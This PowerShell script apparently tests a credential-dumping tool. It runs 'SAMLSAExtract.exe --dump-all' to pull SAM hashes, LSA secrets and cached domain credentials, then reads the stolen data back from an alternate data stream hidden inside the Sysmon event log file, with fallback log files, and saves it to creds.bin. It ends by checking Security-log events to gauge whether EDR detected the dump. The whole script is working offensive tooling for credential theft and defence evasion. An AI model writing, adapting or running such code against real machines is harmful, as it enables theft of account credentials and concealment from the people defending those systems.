# run_test.ps1 — Plan 2: SAM + LSA + MSCache Dump Test
param([switch]$SkipCleanup, [string]$OutputDir = ".\output")

$TOOL = "..\SAMLSAExtract.exe"
$LOG  = Join-Path $OutputDir "test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null }

function Log($m) { "$(Get-Date -Format 'HH:mm:ss.fff') $m" | Tee-Object $LOG -Append }

Log "=" * 70
Log "  Plan 2: SAM + LSA Secrets + Cached Credentials Dump Test"
Log "  Target: T1003.002/.004/.005 — Raw NTFS + Offline Hive Parse"
Log "=" * 70
Log ""

# ─── Environment ───
Log ">>> ENVIRONMENT <<<"
$os = Get-WmiObject Win32_OperatingSystem
Log "OS: $($os.Caption) ($($os.Version)) Build $($os.BuildNumber)"

# Check SYSTEM
$isSystem = [System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
Log "SYSTEM: $(if($isSystem){'YES'}else{'NO (will likely fail)'})"
Log ""

# ─── Run ───
Log ">>> EXTRACTION <<<"
$sw = [Diagnostics.Stopwatch]::StartNew()
$result = & $TOOL --dump-all 2>&1
$sw.Stop()
foreach ($line in $result) { Log $line }
Log "Duration: $($sw.Elapsed.TotalSeconds.ToString('F2'))s | Exit: $LASTEXITCODE"
Log ""

# ─── Verify ADS ───
Log ">>> VERIFICATION <<<"
$adsPath = "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx:Microsoft-Windows-CredentialManager%4Debug"
try {
    $ads = Get-Content $adsPath -Raw -EA Stop
    Log "ADS found: $($ads.Length) bytes"
    $outFile = Join-Path $OutputDir "creds.bin"
    [IO.File]::WriteAllBytes($outFile, [Text.Encoding]::Unicode.GetBytes($ads))
    Log "Saved to: $outFile"
} catch {
    Log "ADS not found at primary path"
    # Check fallbacks
    foreach ($fb in @("Application.evtx", "httperr1.log")) {
        $fbPath = "C:\Windows\System32\winevt\Logs\$fb`:Microsoft-Windows-CredentialManager%4Debug"
        try { $c = Get-Content $fbPath -Raw -EA Stop; Log "Fallback ADS: $fbPath ($($c.Length) bytes)" } catch {}
    }
}
Log ""

# ─── Cross-check with registry ───
Log ">>> CROSS-CHECK (Registry) <<<"
$samUsers = Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True"
Log "Local accounts via WMI: $($samUsers.Count)"
foreach ($u in $samUsers) { Log "  $($u.Name) (SID: $($u.SID))" }
Log ""

# ─── EDR Check ───
Log ">>> EDR CHECK <<<"
try {
    $evts = Get-WinEvent -LogName Security -MaxEvents 50 -EA Stop |
        Where-Object { $_.Id -in @(4663,4656) -and $_.TimeCreated -gt (Get-Date).AddMinutes(-5) }
    Log "Recent object access events: $($evts.Count)"
} catch { Log "Security log not accessible" }
Log ""

Log "=" * 70
Log "  TEST COMPLETE"
Log "=" * 70
